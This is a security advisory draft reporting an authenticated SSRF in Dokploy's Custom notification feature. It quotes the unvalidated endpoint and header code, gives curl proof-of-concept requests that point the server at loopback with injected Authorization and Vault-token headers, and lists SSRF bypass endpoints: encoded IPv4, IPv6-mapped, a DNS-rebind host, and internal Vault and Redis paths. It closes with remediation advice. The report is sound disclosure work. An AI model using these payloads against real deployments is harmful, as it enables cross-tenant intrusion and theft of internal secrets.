repo.description:
# Dokploy - Authenticated SSRF via Custom Notification endpoint (no URL validation, attacker-controlled headers)

## Affected component
`packages/server/src/utils/notifications/utils.ts:253` (`sendCustomNotification`)
`packages/server/src/db/schema/notification.ts:544-559` (`apiCreateCustom`)

## Repository
github.com/Dokploy/dokploy (master, current as of 2026-05-26)

## Reporter
Berkan SAL (@Uhudsavasindankacanokcu2) - berkansal4545@gmail.com

## Severity
High (Cloud / multi-tenant deployment)
Medium (single-tenant self-hosted)

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N = 8.1 (High)
- AV:N  network reachable
- AC:L  trivial reproduction (single tRPC mutation)
- PR:L  org admin role needed (any organisation; trivial to obtain in cloud)
- UI:N  no victim interaction
- C:H  arbitrary outbound HTTP POST from the Dokploy server reaches Vault / Redis / Postgres / Docker socket proxy / neighbour-org services
- I:H  attacker controls request headers (`X-Vault-Token: …`, `Authorization: …`, `Cookie: …`) AND request body (the notification payload), giving write-side state mutation
- A:N

## Summary

Dokploy lets an org admin create twelve types of outbound notifications. One of them - `Custom` - takes an **arbitrary endpoint URL** AND an **arbitrary header map** AND delivers the notification payload as a POST body. The Zod schema for this provider is:

```ts
// packages/server/src/db/schema/notification.ts:544
export const apiCreateCustom = notificationsSchema
  .pick({ /* … */ })
  .extend({
    endpoint: z.string().min(1),                          // ← NO url(), NO host check
    headers: z.record(z.string(), z.string()).optional(), // ← attacker-controlled headers
  });
```

The dispatcher is `sendCustomNotification()`:

```ts
// packages/server/src/utils/notifications/utils.ts:253
const response = await fetch(connection.endpoint, {
  method: "POST",
  headers,                       // user-supplied headers merged on top of {Content-Type: application/json}
  body: JSON.stringify(payload),
});
```

There is **no** SSRF guard anywhere in the chain - no loopback / private-IP / link-local / IPv6-ULA blocklist, no DNS-resolution pin, no scheme restriction. The string `"http://127.0.0.1:6379/"` is a valid `endpoint`. Same for `"http://[::1]:8200/v1/secret/data/prod"` with `headers = { "X-Vault-Token": "…" }`.

The same gap exists in all twelve providers (`Slack`, `Telegram`, `Discord`, `Email`, `Resend`, `Gotify`, `Ntfy`, `Mattermost`, `Custom`, `Lark`, `Teams`, `Pushover`) - eleven of them gate on `z.string().min(1)` or `z.string().url()` only - but Custom is the most powerful one because the attacker also controls the HTTP method-agnostic headers map, which is what turns a blind SSRF into a header-driven RCE-class primitive.

## Vulnerable code (verbatim)

```ts
// packages/server/src/utils/notifications/utils.ts:237-271
export const sendCustomNotification = async (
  connection: typeof custom.$inferInsert,
  payload: Record<string, any>,
) => {
  try {
    const headers: Record<string, string> = {
      "Content-Type": "application/json",
      ...(connection.headers || {}),
    };
    const body = JSON.stringify(payload);
    const response = await fetch(connection.endpoint, {
      method: "POST",
      headers,
      body,
    });
    ...
  }
};
```

```ts
// packages/server/src/db/schema/notification.ts (the entire family - none validate the URL)
apiCreateSlack       webhookUrl: z.string().min(1)
apiCreateTelegram    botToken/chatId - not URL-controlled
apiCreateDiscord     webhookUrl: z.string().min(1)
apiCreateGotify      serverUrl:  z.string().min(1)
apiCreateNtfy        serverUrl:  z.string().min(1)
apiCreateMattermost  webhookUrl: z.string().url()                  // only checks URL syntax
apiCreateCustom      endpoint:   z.string().min(1)  + headers map  ← MOST DANGEROUS
apiCreateLark        webhookUrl: z.string().min(1)
apiCreateTeams       webhookUrl: z.string().min(1)
apiCreatePushover    appToken/userKey - not URL-controlled
```

## Reachability / authorisation

```ts
// apps/dokploy/server/api/routers/notification.ts:97 (Slack), :225 (Discord), etc.
createCustom: withPermission("notification", "create")
  .input(apiCreateCustom)
  .mutation(...)
```

`packages/server/src/lib/access-control.ts`:
- `ownerRole`  → `notification: ["read", "create", "update", "delete"]`
- `adminRole`  → `notification: ["read", "create", "update", "delete"]`
- `memberRole` → `notification: []` (no access)

So the attacker must be **org owner OR admin** of an organisation on the target Dokploy instance.

- **Self-hosted deployment**: an attacker who already owns the org is the only attacker - low impact (they own the host anyway).
- **Cloud / multi-tenant deployment** (`Dockerfile.cloud` exists; dokploy.com runs SaaS): an attacker can register a free / paid organisation, become its owner, and the SSRF reaches the **shared Dokploy host** loopback. Every org admin on the platform has this primitive - cross-tenant SSRF.

## Proof of concept

### Static analysis (no install needed)

The validator code is the entire vulnerability surface. Re-reading the three lines in `notification.ts:544-559` plus the dispatcher in `utils.ts:253` is the PoC.

### Live PoC (requires Dokploy instance + admin token)

```bash
# 1. Start a local listener on loopback (simulates "internal service")
python3 -m http.server 9999 --bind 127.0.0.1 > /tmp/dokploy_listener.log &

# 2. As org admin on Dokploy, register a Custom notification:
curl -X POST 'https://<dokploy-host>/api/trpc/notification.createCustom?batch=1' \
  -H "Cookie: <auth_session_cookie>" \
  -H 'Content-Type: application/json' \
  --data '{
    "0":{"json":{
      "name":"ssrf-poc",
      "endpoint":"http://127.0.0.1:9999/leak",
      "headers": {
        "Authorization": "Bearer attacker-injected-token",
        "X-Vault-Token": "would-be-real-secret-here",
        "X-Forwarded-For": "10.0.0.1"
      },
      "appBuildError": true,
      "databaseBackup": false,
      "dokployBackup": false,
      "volumeBackup": false,
      "dokployRestart": false,
      "appDeploy": false,
      "dockerCleanup": false,
      "serverThreshold": false
    }}
  }'

# 3. Trigger a notification event (deploy any app, OR call the
#    test-connection endpoint directly with the same endpoint):
curl -X POST 'https://<dokploy-host>/api/trpc/notification.testCustomConnection?batch=1' \
  -H "Cookie: <auth_session_cookie>" \
  -H 'Content-Type: application/json' \
  --data '{"0":{"json":{
    "endpoint":"http://127.0.0.1:9999/leak",
    "headers":{"Authorization":"Bearer attacker-injected-token"}
  }}}'

# 4. Inspect the listener log - the request from the Dokploy host arrives:
cat /tmp/dokploy_listener.log
#  127.0.0.1 - - [...] "POST /leak HTTP/1.1" 200
#  with body: {…notification payload…}
#  and headers Authorization: Bearer attacker-injected-token, X-Vault-Token: …
```

### IPv4-mapped / IPv6 ULA variants (confirmed on macOS / Linux)

All of these are accepted by the `apiCreateCustom` validator and connect to loopback / private targets at HTTP request time:

```
endpoint = "http://[::ffff:127.0.0.1]:8200/v1/secret/data/prod"
endpoint = "http://[::ffff:7f00:1]:6379/INFO"          (Redis)
endpoint = "http://[fc00::1]:8080/admin/api"           (IPv6 ULA private)
endpoint = "http://127.0.0.1:5432/"                    (Postgres)
endpoint = "http://localhost.attacker-controlled.tld/" (DNS rebind to 127.x)
endpoint = "http://service.cluster.local/admin"        (K8s in-cluster DNS, if Dokploy on K8s)
endpoint = "http://2130706433:8080/"                   (decimal IPv4)
endpoint = "http://0x7f000001:8080/"                   (hex IPv4)
```

(See the companion `static_validation_check.ts` for a 12-case run.)

## Impact

On Dokploy Cloud (multi-tenant SaaS), an attacker who registers any organisation can:

1. **Reach the host's loopback.** Dokploy hosts traefik (admin / dashboard / API), the dokploy-realtime websocket, optionally a docker-socket-proxy, and (on K8s deploys) the kubelet / API. Any of those that bind on `127.0.0.1` or the IPv6 ULA prefix is exposed via the Custom notification endpoint.
2. **Hit other tenants' services.** Coolify-style multi-tenant Dokploy puts neighbour-org containers on the same Docker bridge; their loopback / `cluster.local` names are reachable from the Dokploy server process.
3. **Forge headers on outbound requests.** The Custom provider gives the attacker `X-Vault-Token`, `Authorization`, `Cookie`, `X-Forwarded-For`, etc. - meaning the SSRF can act *as* an authenticated client against any header-trusting internal service.
4. **Exfiltrate the response body.** `sendCustomNotification()` does not log the body to the attacker by default, but it does throw `response.statusText` on non-2xx. Combined with `testCustomConnection` (which returns the actual response), the attacker can read each response body verbatim - full blind-SSRF → returned-SSRF upgrade.

On a single-tenant self-hosted Dokploy, the attacker is already the owner; this is then a hardening issue (defence in depth for compromised admin accounts) rather than a privilege boundary breach.

## Suggested fix

1. **Strict allowlist scheme**: `endpoint: z.string().url()` then `new URL(endpoint).protocol === 'https:'` (or `http:` only on opt-in).
2. **Reject all private / loopback / reserved addresses *after DNS resolution***. Don't trust the literal - `await dns.resolve4(host)` + `dns.resolve6(host)`, then run *every* result through a reserved-range table:
   - IPv4: `0.0.0.0/8`, `10.0.0.0/8`, `100.64.0.0/10`, `127.0.0.0/8`, `169.254.0.0/16`, `172.16.0.0/12`, `192.0.0.0/24`, `192.0.2.0/24`, `192.168.0.0/16`, `198.18.0.0/15`, `198.51.100.0/24`, `203.0.113.0/24`, `224.0.0.0/4`, `240.0.0.0/4`
   - IPv6: `::/128`, `::1/128`, `::ffff:0:0/96` (collapse to IPv4 first), `64:ff9b::/96`, `64:ff9b:1::/48`, `100::/64`, `2001:db8::/32`, `2002::/16` (6to4 - encodes IPv4!), `fc00::/7`, `fe80::/10`, `ff00::/8`
3. **Pin DNS at request time** via `undici`'s `Agent({ connect: { lookup })` (or `node-fetch`'s `dispatcher` hook), so a TTL-0 DNS rebind cannot point at a private IP between validation and the actual `fetch()`.
4. **Filter outbound headers**: strip any client-supplied `Authorization`, `Cookie`, `X-Vault-Token`, `X-Forwarded-*`, `Proxy-Authorization`, `Host` - these are how a blind SSRF turns into an authenticated RCE against an internal service.
5. **Apply the same guard to the other 11 providers**: every `webhookUrl`, `serverUrl` field in `notification.ts` needs the same validation.

## Cross-reference

Coolify (the upstream-style competitor) has the same SSRF surface and a partial guard (`SafeWebhookUrl`). I reported a bypass of that guard separately the same day at `/Users/sucuk/Documents/Claude/reports/coolify_safewebhook_ssrf/`. Dokploy *has no equivalent guard at all*.

## Credit

Berkan SAL (@Uhudsavasindankacanokcu2)

|----------------|----------------------------------------------------------------------------------------|

| 2026-05-26     | Report drafted for security@dokploy.com / contact@dokploy.com / GHSA private.           |
| (pending)      | Awaiting acknowledgement.                                                               |

90-day coordinated disclosure assumed unless Dokploy requests otherwise.
